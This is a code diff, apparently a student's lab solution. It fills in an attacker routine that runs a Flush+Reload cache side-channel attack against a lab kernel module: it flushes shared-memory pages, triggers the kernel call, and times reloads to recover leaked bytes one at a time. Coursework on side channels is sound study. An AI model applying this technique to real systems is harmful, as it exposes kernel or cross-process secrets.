@@ -12,6 +12,9 @@
 #include "lab2.h"
 #include "lab2ipc.h"
 
+//Helper functions and misc variables
+uint64_t latency = 0;
+uint64_t threshold = 175;
 /*
  * call_kernel_part1
  * Performs the COMMAND_PART1 call in the kernel
@@ -51,7 +54,28 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Use "call_kernel_part1" to interact with the kernel module
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
+	
+	//Flush the shared memory	
+	for(size_t i=0; i<255; i++) {
+		clflush(shared_memory+i*4096);
+		//latency[i] = time_access((char*)(shared_memory+i*4096));	
+		//printf("Latency = %d\n", latency[i]);	
+	}	
 
+	//Call the kernel
+	call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+	//Reload and check latency
+	size_t j;
+	for(j=0; j<255; j++) {
+		latency = time_access((char*)(shared_memory+j*4096));
+		//printf("Latency = %d\n", latency[i]);
+		if(latency < threshold) {
+			break;
+		}	
+	}
+	leaked_byte = j;	
+	//printf("j = %d\n", j);
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
